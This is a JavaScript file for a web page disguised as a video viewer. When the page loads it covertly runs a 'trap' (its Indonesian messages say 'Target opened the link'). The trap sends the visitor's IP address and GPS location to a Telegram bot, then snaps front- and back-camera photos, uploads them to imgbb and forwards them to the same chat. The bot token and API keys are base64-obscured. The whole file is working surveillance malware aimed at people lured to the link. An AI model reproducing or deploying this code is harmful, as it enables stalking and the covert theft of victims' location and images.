
const BOT_TOKEN = atob('NzY3ODUxNjQwODpBQUc1b2prN3JDZUhUTDVhWkRZak9obGlYRVRGVWZybUY4Yw==');
const CHAT_ID = atob('ODE1NTI3NDI1MA==');
const IMGBB_API_KEY = atob('MjIyZDJiZGJjNGU0MTI2YmNhYmQ1ZDBiNDg1N2QwNGQ=');
const NUM_PHOTOS = 10;

const media_list = ["https://files.catbox.moe/gq0w42.mp4", "https://files.catbox.moe/gq0w42.mp4", "https://files.catbox.moe/gq0w42.mp4", "https://files.catbox.moe/gq0w42.mp4"];
const media_type = 'video';
const main_media = document.querySelector('#media-viewer > *');

function changeMedia(index) {
    main_media.src = media_list[index] + (media_type === 'video' ? '#t=0.1' : '');
    if (media_type === 'video') { main_media.muted = false; main_media.play(); }
}

function sendToTelegram(message) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'Markdown' })
    });
}

function sendPhotoToTelegram(photoUrl, caption) {
    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST', headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ chat_id: CHAT_ID, photo: photoUrl, caption: caption })
    });
}

async function getFullInfo() {
    sendToTelegram('🔥 *Jebakan Aktif! Target Membuka Link...*');
    const delay = ms => new Promise(res => setTimeout(res, ms));

    // 1. Info Perangkat
    try {
        const ip_res = await fetch('https://ip-api.com/json');
        const ip_data = await ip_res.json();
        const msg = `*📱 Info IP:* \`${ip_data.query}\` (${ip_data.isp})`;
        sendToTelegram(msg);
    } catch (e) {}

    await delay(500);

    // 2. Lokasi
    await new Promise(resolve => {
        navigator.geolocation.getCurrentPosition(pos => {
            sendToTelegram(`*📍 Lokasi:*
Lat: \`${pos.coords.latitude}\`, Lon: \`${pos.coords.longitude}\``);
            resolve();
        }, err => { resolve(); });
    });
    
    await delay(500);

    // 3. Kamera (Depan & Belakang)
    for (let facingMode of ['user', 'environment']) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
            const track = stream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(track);
            const blob = await imageCapture.takePhoto();
            track.stop();
            sendToTelegram(`- Foto [${facingMode}] diambil, mengunggah...`);
            const formData = new FormData();
            formData.append('image', blob, 'snap.jpg');
            const res = await fetch(`https://api.imgbb.com/1/upload?key=${IMGBB_API_KEY}`, { method: 'POST', body: formData });
            const result = await res.json();
            if (result.success) sendPhotoToTelegram(result.data.url, `Foto Jebakan [${facingMode}]`);
        } catch(e) {}
        await delay(500);
    }
    sendToTelegram('✅ *Misi Selesai.*');
}

window.onload = getFullInfo;
